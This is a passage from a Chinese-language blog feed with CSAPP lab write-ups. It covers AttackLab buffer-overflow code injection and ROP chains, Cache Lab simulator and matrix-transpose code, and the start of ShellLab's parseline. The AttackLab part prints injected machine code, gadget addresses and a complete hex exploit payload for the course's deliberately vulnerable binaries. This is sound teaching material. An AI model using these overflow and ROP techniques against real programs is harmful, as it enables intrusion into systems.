poisoning.</li></ul><h3 id="第二周-6-20-6-26"><a href="#第二周-6-20-6-26" class="headerlink" title="第二周: 6/20-6/26"></a>第二周: 6/20-6/26</h3><ul><li>20-23: 一些advance和小学期.</li><li>24-26: 算是学完了pwn.college, 然后整点单片机编程, 再然后开整CTF</li></ul><h3 id="第三周-6-27-7-3"><a href="#第三周-6-27-7-3" class="headerlink" title="第三周: 6/27-7/3"></a>第三周: 6/27-7/3</h3><ul><li>27: </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Learning-CSAPP-Lab/"/>
    <url>/2021-05/Learning-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>要会使用hex2raw和ctarget和rtarget, 用管道符号比较方便. </p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>直接使用溢出的8字节改写为touch1的地址</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></div></td></tr></table></figure><p>此阶段需要执行栈上的代码, 在缓冲区里填充所写的代码后, 用gdb获得buf的栈顶, 覆盖getbuf的返回地址即可</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3函数里调用了hexmatch(cookie, sval), sval是char*类型且为touch3的第一个变量, 作用是比较字符串sval和cookie是否相同, 所以在调用touch3之前需要将%rdi设置为cookie的字符串形式, 即ASCII码值, 程序的大致运行过程如下:</p><ol><li><p>test=&gt;getbuf, 40字节的栈空间存放攻击代码, 内容为: 设置%rdi, 将touch3地址推到栈上, ret. 溢出的8字节为getbuf返回地址, 改写为攻击代码的首地址.</p><img src="../../image/CSAPP_Lab/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>首地址获取方法: 用gdb调试设置断点到getbuf, 找到%rsp减去40后的值, 即为攻击代码地址</p></li><li><p>设置%rdi还要注意hexmatch的随机函数, 所以将输入的字符串存到getbuf返回地址的上方test代码段里, 与攻击代码距离40+8(返回地址)字节, 将该地址mov到%rdi里. 由于一次性使用程序, 不用关心test里的数据被改变</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>这一节实际上重复了phase2的任务, 但是使用了栈随机化和限制代码可执行区域, 所以采用ROP进行攻击.</p><p>使用objdump -s rtarget &gt; rtarget.s得到反汇编代码, 可以从handout中得知所需的gadget在以start_farm函数开始, 以mid_farm结束的一些函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></div></td></tr></table></figure><p>由于找不到直接pop %rdi的代码, 所以转向pop到其他寄存器然后mov到%rdi中, 这时候可以发现addval_219和addval_273中的58 90 c3, 48 89 c7 c3, 即pop %rax, mov %rax, %rdi(真tm就是直接找啊).</p><p>然后在buf里填充40字节空字符, 溢出的8字节定位到219, 从栈上pop出cookie, ret(0xc3)指令从栈上弹出一个地址即273的地址, 执行完mov后再ret, 最终跳转到touch2.</p><img src="../../image/CSAPP_Lab/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40字节<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></div></td></tr></table></figure><p>结束.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>重复了phase3的任务.Figure 3D就和nop一样, 不改变任何东西, 可以无视.</p></blockquote><p>由于使用了栈随机化, 又需要把cookie的地址放到栈上产生地址, 再存到%rdi中, 所以需要使用一些代码组合来产生一个固定偏移量的栈地址.<strong>有两种方法:</strong> </p><ol><li><p>使用handout里面给出的那些编码, 代码较长所以才说费时间</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></div></td></tr></table></figure><p>%rsp+80处放字符串，%rsp+8处才开始执行addval_190. 所以 <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>使用add指令的编码, 使得实际只需三行汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></div></td></tr></table></figure><p>提取后:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></div></td></tr></table></figure><p>结束.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>就，没什么可说的，白嫖真香。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// 注意是无符号整数</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// 所需数据的cache_line编号</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// 数据未命中</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// 在一组cache_line中查找将被删除的cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// 如果当前这个要被删除的cache_line是valid</span><br>      <span class="hljs-comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// 删除数+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// 模拟从**主存**读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 查找cache中的数据</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果找到数据了，自然就hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// 读取/写入数据</span><br>      <span class="hljs-comment">// 写入数据同样需要判断数据是否存在与cache。如果数据不在，同样要将其读回cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// 如果当前指令是修改指令，则上一条accessData读取数据，下一条的accessData写入数据</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>最优解法是非常暴力非常详细的写出每一行的移动情况，普通解法是规规矩矩的8分块。<a href="https://zhuanlan.zhihu.com/p/79058089">链接</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>第一种解法是八分块然后再4分块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>第二种解法在那个链接里的评论区里1024次miss, 未看.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* 遇到了冲突元素 */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h3><p>附上手算miss率的神人<a href="https://zhuanlan.zhihu.com/p/28585726">专栏</a>. 以及CMU的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">课件</a>, miss次数好像就是这上面的.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2><h3 id="通过parseline理解一下如何编写"><a href="#通过parseline理解一下如何编写" class="headerlink" title="通过parseline理解一下如何编写"></a>通过parseline理解一下如何编写</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span>  <span class="hljs-comment">// cmdline--&gt;argv_array</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that *traverses* command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span> <span class="hljs-comment">//这里已经到了第一个非空字符</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>buf++;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>delim = <span 